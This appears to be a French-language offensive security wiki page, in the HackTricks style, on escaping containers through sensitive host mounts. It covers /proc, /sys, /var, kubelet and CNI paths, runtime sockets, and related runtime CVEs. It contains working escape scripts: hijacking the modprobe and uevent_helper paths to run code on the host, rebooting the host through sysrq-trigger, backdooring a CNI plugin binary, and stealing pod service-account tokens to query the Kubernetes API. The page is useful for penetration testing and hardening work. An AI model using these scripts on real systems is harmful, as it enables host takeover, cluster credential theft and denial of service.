# Sensitive Host Mounts

{{#include ../../../banners/hacktricks-training.md}}

## Overview

Les host mounts sont l’une des surfaces les plus importantes et pratiques pour une container-escape, car elles ramènent souvent une vue de processus soigneusement isolée à une visibilité directe des ressources de l’hôte. Les cas dangereux ne se limitent pas à `/`. Les bind mounts de `/proc`, `/sys`, `/var`, des runtime sockets, de l’état géré par kubelet, ou de chemins liés aux devices peuvent exposer des contrôles du kernel, des credentials, les filesystems de conteneurs voisins, et des interfaces de gestion du runtime.

Cette page existe séparément des pages de protection individuelles parce que le modèle d’abus est transversal. Un host mount en écriture est dangereux en partie à cause des mount namespaces, en partie à cause des user namespaces, en partie à cause de la couverture AppArmor ou SELinux, et en partie à cause du chemin exact de l’hôte exposé. Le traiter comme un sujet à part rend la surface d’attaque beaucoup plus facile à raisonner.

## `/proc` Exposure

procfs contient à la fois des informations ordinaires sur les processus et des interfaces de contrôle du kernel à fort impact. Un bind mount comme `-v /proc:/host/proc` ou une vue du conteneur qui expose des entrées proc en écriture inattendues peut donc conduire à une divulgation d’informations, à un déni de service, ou à une exécution directe de code sur l’hôte.

Les chemins procfs à forte valeur incluent :

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc`
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/kmem`
- `/proc/mem`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Abuse

Commencez par vérifier quelles entrées procfs à forte valeur sont visibles ou inscriptibles :
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
Ces chemins sont intéressants pour différentes raisons. `core_pattern`, `modprobe` et `binfmt_misc` peuvent devenir des chemins d’exécution de code sur l’hôte lorsqu’ils sont inscriptibles. `kallsyms`, `kmsg`, `kcore` et `config.gz` sont de puissantes sources de reconnaissance pour l’exploitation du kernel. `sched_debug` et `mountinfo` révèlent le contexte des process, des cgroup et du filesystem, ce qui peut aider à reconstituer la disposition de l’hôte depuis l’intérieur du container.

La valeur pratique de chaque chemin est différente, et les traiter tous comme s’ils avaient le même impact rend le tri plus difficile :

- `/proc/sys/kernel/core_pattern`
Si inscriptible, c’est l’un des chemins procfs à plus fort impact, car le kernel exécutera un gestionnaire de pipe après un crash. Un container capable de pointer `core_pattern` vers un payload stocké dans son overlay ou dans un chemin hôte monté peut souvent obtenir une exécution de code sur l’hôte. Voir aussi [read-only-paths.md](protections/read-only-paths.md) pour un exemple dédié.
- `/proc/sys/kernel/modprobe`
Ce chemin contrôle l’helper userspace utilisé par le kernel lorsqu’il doit invoquer la logique de chargement de module. S’il est inscriptible depuis le container et interprété dans le contexte de l’hôte, il peut devenir un autre primitive d’exécution de code sur l’hôte. Il est particulièrement intéressant lorsqu’il est combiné avec un moyen de déclencher le chemin de l’helper.
- `/proc/sys/vm/panic_on_oom`
Ce n’est généralement pas une primitive d’évasion propre, mais cela peut convertir la pression mémoire en déni de service à l’échelle de l’hôte en transformant les conditions OOM en comportement de kernel panic.
- `/proc/sys/fs/binfmt_misc`
Si l’interface d’enregistrement est inscriptible, l’attaquant peut enregistrer un handler pour une valeur magique choisie et obtenir une exécution dans le contexte de l’hôte lorsqu’un fichier correspondant est exécuté.
- `/proc/config.gz`
Utile pour le tri de l’exploitation du kernel. Cela aide à déterminer quels sous-systèmes, mitigations et fonctionnalités optionnelles du kernel sont activés sans avoir besoin des métadonnées de paquets de l’hôte.
- `/proc/sysrq-trigger`
Principalement un chemin de déni de service, mais très sérieux. Il peut redémarrer, provoquer un panic ou perturber immédiatement l’hôte.
- `/proc/kmsg`
Révèle les messages du ring buffer du kernel. Utile pour le fingerprinting de l’hôte, l’analyse de crash et, dans certains environnements, pour divulguer des informations utiles à l’exploitation du kernel.
- `/proc/kallsyms`
Précieux lorsqu’il est lisible, car il expose les informations des symboles exportés du kernel et peut aider à contourner les hypothèses d’anonymisation des adresses lors du développement d’exploits kernel.
- `/proc/[pid]/mem`
C’est une interface directe vers la mémoire d’un process. Si le process cible est accessible avec les conditions ptrace nécessaires, cela peut permettre de lire ou modifier la mémoire d’un autre process. L’impact réel dépend fortement des credentials, de `hidepid`, de Yama et des restrictions ptrace, donc c’est un chemin puissant mais conditionnel.
- `/proc/kcore`
Expose une vue de type image core de la mémoire du système. Le fichier est énorme et peu pratique à utiliser, mais s’il est réellement lisible, cela indique une surface de mémoire de l’hôte mal exposée.
- `/proc/kmem` et `/proc/mem`
Interfaces brutes de mémoire historiquement à fort impact. Sur de nombreux systèmes modernes, elles sont désactivées ou fortement restreintes, mais si elles sont présentes et utilisables, elles doivent être traitées comme des findings critiques.
- `/proc/sched_debug`
Divulgue des informations de scheduling et de tâches qui peuvent exposer les identités des process de l’hôte même lorsque les autres vues des process paraissent plus propres que prévu.
- `/proc/[pid]/mountinfo`
Extrêmement utile pour reconstituer où se trouve réellement le container sur l’hôte, quels chemins sont supportés par overlay, et si un mount inscriptible correspond au contenu de l’hôte ou seulement à la couche du container.

Si `/proc/[pid]/mountinfo` ou les détails overlay sont lisibles, utilisez-les pour récupérer le chemin hôte du filesystem du container :
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
Ces commandes sont utiles car un certain nombre de techniques de host-execution nécessitent de convertir un chemin à l'intérieur du container en le chemin correspondant du point de vue du host.

### Full Example: `modprobe` Helper Path Abuse

Si `/proc/sys/kernel/modprobe` est accessible en écriture depuis le container et que le helper path est interprété dans le contexte du host, il peut être redirigé vers un payload contrôlé par l'attaquant :
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /tmp/modprobe-payload
#!/bin/sh
id > /tmp/modprobe.out
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
```
Le déclencheur exact dépend de la cible et du comportement du kernel, mais le point important est qu'un chemin d'assistance inscriptible peut rediriger une future invocation de kernel helper vers du contenu de host-path contrôlé par l'attaquant.

### Full Example: Kernel Recon With `kallsyms`, `kmsg`, And `config.gz`

Si l'objectif est l'évaluation de l'exploitabilité plutôt qu'une évasion immédiate :
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
Ces commandes aident à répondre à la question de savoir si des informations de symboles utiles sont visibles, si de récents messages du kernel révèlent un état intéressant, et quelles fonctionnalités ou mitigations du kernel sont compilées. L'impact n'est généralement pas un escape direct, mais cela peut réduire fortement le temps de triage des vulnérabilités du kernel.

### Full Example: SysRq Host Reboot

Si `/proc/sysrq-trigger` est accessible en écriture et atteint la vue de l'hôte :
```bash
echo b > /proc/sysrq-trigger
```
L’effet est un redémarrage immédiat de l’hôte. Ce n’est pas un exemple subtil, mais cela montre clairement que l’exposition de procfs peut être bien plus grave qu’une simple divulgation d’informations.

## `/sys` Exposure

sysfs expose de grandes quantités d’état du kernel et des devices. Certains chemins sysfs sont surtout utiles pour le fingerprinting, tandis que d’autres peuvent affecter l’exécution des helpers, le comportement des devices, la configuration des security-modules ou l’état du firmware.

Les chemins sysfs à forte valeur incluent :

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

Ces chemins comptent pour différentes raisons. `/sys/class/thermal` peut influencer le comportement de la gestion thermique et donc la stabilité de l’hôte dans des environnements mal exposés. `/sys/kernel/vmcoreinfo` peut leak des informations de crash-dump et de kernel-layout qui aident au fingerprinting bas niveau de l’hôte. `/sys/kernel/security` est l’interface `securityfs` utilisée par Linux Security Modules, donc un accès inattendu peut exposer ou modifier l’état lié au MAC. Les chemins EFI variables peuvent affecter les paramètres de boot stockés dans le firmware, ce qui les rend bien plus sérieux que de simples fichiers de configuration. `debugfs` sous `/sys/kernel/debug` est particulièrement dangereux car c’est volontairement une interface orientée développeur, avec beaucoup moins d’attentes de sécurité que les API kernel durcies destinées à la production.

Les commandes de review utiles pour ces chemins sont :
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
Ce qui rend ces commandes intéressantes :

- `/sys/kernel/security` peut révéler si AppArmor, SELinux, ou une autre surface LSM est visible d’une manière qui aurait dû rester réservée à l’hôte.
- `/sys/kernel/debug` est souvent la découverte la plus inquiétante dans ce groupe. Si `debugfs` est monté et lisible ou inscriptible, attendez-vous à une large surface côté kernel dont le risque exact dépend des nœuds de debug activés.
- L’exposition des variables EFI est moins courante, mais si elle est présente, l’impact est élevé car elle touche des paramètres soutenus par le firmware plutôt que de simples fichiers d’exécution ordinaires.
- `/sys/class/thermal` est surtout pertinent pour la stabilité de l’hôte et l’interaction avec le matériel, pas pour une jolie escape de type shell.
- `/sys/kernel/vmcoreinfo` est surtout une source de host-fingerprinting et d’analyse de crash, utile pour comprendre l’état bas niveau du kernel.

### Full Example: `uevent_helper`

Si `/sys/kernel/uevent_helper` est inscriptible, le kernel peut exécuter un helper contrôlé par un attaquant lorsqu’un `uevent` est déclenché :
```bash
cat <<'EOF' > /evil-helper
#!/bin/sh
id > /output
EOF
chmod +x /evil-helper
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /output
```
La raison pour laquelle cela fonctionne est que le chemin du helper est interprété du point de vue de l'hôte. Une fois déclenché, le helper s'exécute dans le contexte de l'hôte plutôt qu'à l'intérieur du conteneur actuel.

## `/var` Exposure

Monter `/var` de l'hôte dans un conteneur est souvent sous-estimé parce que cela ne paraît pas aussi spectaculaire que monter `/`. En pratique, cela peut suffire à atteindre des runtime sockets, des répertoires de snapshot de conteneurs, des volumes de pod gérés par kubelet, des projected service-account tokens, et les systèmes de fichiers des applications voisines. Sur les nœuds modernes, `/var` est souvent l'endroit où se trouve réellement l'état des conteneurs le plus intéressant sur le plan opérationnel.

### Kubernetes Example

Un pod avec `hostPath: /var` peut souvent lire les projected tokens d'autres pods et le contenu des snapshot overlay:
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
Ces commandes sont utiles parce qu’elles indiquent si le mount expose seulement des données d’application sans intérêt ou des identifiants de cluster à fort impact. Un token de service-account lisible peut immédiatement transformer une exécution de code locale en accès à l’API Kubernetes.

Si le token est présent, vérifiez ce qu’il peut atteindre au lieu de vous arrêter à la découverte du token :
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
L'impact ici peut être bien plus important qu'un accès local au node. Un token avec un RBAC large peut transformer un `/var` monté en compromission à l'échelle du cluster.

### Docker And containerd Example

Sur les hôtes Docker, les données pertinentes se trouvent souvent sous `/var/lib/docker`, tandis que sur les nodes Kubernetes basés sur containerd, elles peuvent se trouver sous `/var/lib/containerd` ou dans des paths spécifiques au snapshotter :
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
Si le `/var` monté expose des contenus de snapshot inscriptibles d’un autre workload, l’attaquant peut être en mesure de modifier des fichiers d’application, de déposer du contenu web ou de changer des scripts de démarrage sans toucher à la configuration du container actuel.

Idées concrètes d’abus une fois que des contenus de snapshot inscriptibles sont trouvés :
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f -path '*/.ssh/*' -o -path '*/authorized_keys' 2>/dev/null | head -n 20
```
These commands are useful because they show the three main impact families of mounted `/var`: application tampering, secret recovery, and lateral movement into neighboring workloads.

## Kubelet State, Plugins, And CNI Paths

Un mount de `/var/lib/kubelet`, `/opt/cni/bin`, ou `/etc/cni/net.d` est souvent exposé via des DaemonSets privilégiés, des agents CNI, des CSI node plugins, des GPU operators, et des helpers de stockage. Ces mounts sont faciles à écarter comme de la simple "node plumbing", mais ils se trouvent directement dans le chemin d'exécution des nouveaux pods et contiennent souvent des kubelet credentials, des projected secrets, des sockets de registration, et des binaries host-side plugin exécutables.

Les cibles à forte valeur incluent :

- `/var/lib/kubelet/pki`
- `/var/lib/kubelet/pods`
- `/var/lib/kubelet/device-plugins/kubelet.sock`
- `/var/lib/kubelet/pod-resources/kubelet.sock`
- `/var/lib/kubelet/plugins`
- `/var/lib/kubelet/plugins_registry`
- `/opt/cni/bin`
- `/etc/cni/net.d`

Les commandes de review utiles sont :
```bash
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | \
egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
```
Pourquoi ces chemins comptent :

- `/var/lib/kubelet/pki` peut exposer des certificats client kubelet et d’autres identifiants locaux du node qui peuvent parfois être réutilisés contre le API server ou des endpoints TLS orientés kubelet, selon la conception du cluster.
- `/var/lib/kubelet/pods` contient souvent des tokens de service-account projetés et des Secrets montés pour des pods voisins sur le même node.
- `/var/lib/kubelet/pod-resources/kubelet.sock` est surtout une surface de reconnaissance, mais très utile : elle révèle quels pods et containers possèdent actuellement des GPUs, des hugepages, des devices SR-IOV, et d’autres ressources locales rares du node.
- `/var/lib/kubelet/device-plugins`, `/var/lib/kubelet/plugins`, et `/var/lib/kubelet/plugins_registry` révèlent quels plugins CSI, DRA et device sont installés et quels sockets le kubelet est censé contacter. Si ces répertoires sont inscriptibles plutôt que simplement lisibles, le finding devient beaucoup plus grave.
- `/opt/cni/bin` et `/etc/cni/net.d` se trouvent directement sur le chemin de configuration du réseau des pods. Un accès en écriture là-bas est souvent un primitive d’exécution sur le host différée, plutôt qu’une simple exposition de configuration.

### Full Example: `/opt/cni/bin` inscriptible

Si un répertoire de binaires CNI du host est monté en lecture-écriture, remplacer un plugin peut suffire à obtenir une exécution sur le host la prochaine fois que le kubelet crée un pod sandbox sur ce node :
```bash
plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
[ -n "$plugin" ] || exit 1
mv "$plugin" "${plugin}.orig"
cat <<'EOF' > "$plugin"
#!/bin/sh
id > /tmp/cni-triggered
exec "$(dirname "$0")/$(basename "$0").orig" "$@"
EOF
chmod +x "$plugin"
echo "wait for the next pod scheduled on this node"
```
Ce n’est pas aussi immédiat qu’un `docker.sock` monté, mais c’est souvent plus réaliste dans des pods d’infrastructure Kubernetes compromis. Le point important est que le binaire modifié est ensuite exécuté par le flux de configuration du réseau de l’hôte, et non par le conteneur actuel.


## Runtime Sockets

Les mounts sensibles de l’hôte incluent souvent des runtime sockets plutôt que des répertoires complets. Ils sont si importants qu’ils méritent d’être répétés explicitement ici:
```text
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
Voir [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) pour les flux d'exploitation complets une fois qu'un de ces sockets est monté.

Comme premier schéma d'interaction rapide :
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
Si l’un de ces cas réussit, le chemin entre « mounted socket » et « démarrer un sibling container plus privilégié » est généralement bien plus court que n’importe quel chemin de kernel breakout.

## Mount-Related CVEs

Les host mounts recoupent aussi les vulnérabilités de runtime. Exemples récents importants :

- `CVE-2024-21626` dans `runc`, où un directory file descriptor divulgué pouvait placer le répertoire de travail sur le filesystem de l’hôte.
- `CVE-2024-23651`, `CVE-2024-23652` et `CVE-2024-23653` dans BuildKit, où des Dockerfiles malveillants, des frontends et des flux `RUN --mount` pouvaient réintroduire l’accès aux fichiers de l’hôte, la suppression ou des privilèges élevés pendant les builds.
- `CVE-2024-1753` dans Buildah et Podman build flows, où des bind mounts forgés pendant le build pouvaient exposer `/` en lecture-écriture.
- `CVE-2025-47290` dans `containerd` 2.1.0, où un TOCTOU pendant le unpack de l’image pouvait permettre à une image spécialement forgée de modifier le filesystem de l’hôte pendant le pull.

Ces CVEs sont importantes ici parce qu’elles montrent que la gestion des mounts ne dépend pas seulement de la configuration de l’opérateur. Le runtime lui-même peut aussi introduire des conditions d’escape liées aux mounts.

## Checks

Utilisez ces commandes pour localiser rapidement les expositions de mount les plus intéressantes :
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
Ce qui est intéressant ici :

- Host root, `/proc`, `/sys`, `/var`, et les runtime sockets sont tous des findings à haute priorité.
- Des entrées proc/sys inscriptibles signifient souvent que le mount expose des contrôles kernel globaux au niveau de l’hôte plutôt qu’une vue container sûre.
- Les chemins `/var` montés méritent un examen des credentials et des workloads voisins, pas seulement un examen du filesystem.
- Les répertoires d’état kubelet et les chemins CNI/plugin méritent la même priorité que les runtime sockets car ils se trouvent souvent directement sur le chemin de création des pods et de distribution des credentials du node.

## References

- [Local Files And Paths Used By The Kubelet](https://kubernetes.io/docs/reference/node/kubelet-files/)
- [cilium-agent container can access the host via `hostPath` mount](https://github.com/cilium/cilium/security/advisories/GHSA-4hc4-pgfx-3mrx)
{{#include ../../../banners/hacktricks-training.md}}
